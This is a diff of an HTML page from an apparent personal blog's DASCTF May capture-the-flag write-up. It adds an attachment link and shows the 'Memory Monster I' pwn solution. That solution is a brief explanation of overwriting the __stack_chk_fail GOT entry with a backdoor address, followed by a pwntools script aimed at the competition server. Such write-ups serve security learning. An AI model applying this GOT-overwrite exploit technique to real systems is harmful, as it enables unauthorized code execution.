@@ -15,15 +15,15 @@
 
 
 
-<meta name="description" content="TTTTTTTTCL,抱歉,告辞,打不动,再见">
+<meta name="description" content="TTTTTTTTCL,抱歉,告辞,打不动,再见,除了两个OJ盲打外的PWN题附件">
 <meta name="keywords" content="PWN,DASCTF,May">
 <meta property="og:type" content="article">
 <meta property="og:title" content="DASCTF_May">
 <meta property="og:url" content="http:&#x2F;&#x2F;fmyy.pro&#x2F;2020&#x2F;05&#x2F;23&#x2F;Competition&#x2F;DASCTF-May&#x2F;index.html">
 <meta property="og:site_name" content="FMYY&#39;s Blog">
-<meta property="og:description" content="TTTTTTTTCL,抱歉,告辞,打不动,再见">
+<meta property="og:description" content="TTTTTTTTCL,抱歉,告辞,打不动,再见,除了两个OJ盲打外的PWN题附件">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2020-05-23T15:31:57.853Z">
+<meta property="og:updated_time" content="2020-05-25T01:00:18.770Z">
 <meta name="twitter:card" content="summary">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
@@ -255,7 +255,7 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>TTTTTTTTCL,抱歉,告辞,打不动,再见</p>
+        <p>TTTTTTTTCL,抱歉,告辞,打不动,再见,除了两个OJ盲打外的PWN题<a href="./src.zip">附件</a></p>
 <a id="more"></a>
 <h2 id="Memory-Monster-I"><a href="#Memory-Monster-I" class="headerlink" title="Memory Monster I"></a>Memory Monster I</h2><p>任意写改got表,栈溢出检测报错时,会调用__stack_chk_fail函数,因为肯定是第一次调用,没有解析符号,所以改成backdoor就行</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">p = process(<span class="string">'./main'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">p = remote(<span class="string">'183.129.189.60'</span>,<span class="number">10083</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">m</span><span class="params">(address,content)</span>:</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">	p.sendafter(<span class="string">'addr'</span>,address)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">	p.sendafter(<span class="string">'data:'</span>,content)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">m(p64(<span class="number">0x404028</span>) + <span class="string">'\x00'</span>*<span class="number">0xC0</span>,<span class="string">'\x4A\x12'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">p.interactive()</span></pre></td></tr></table></figure>
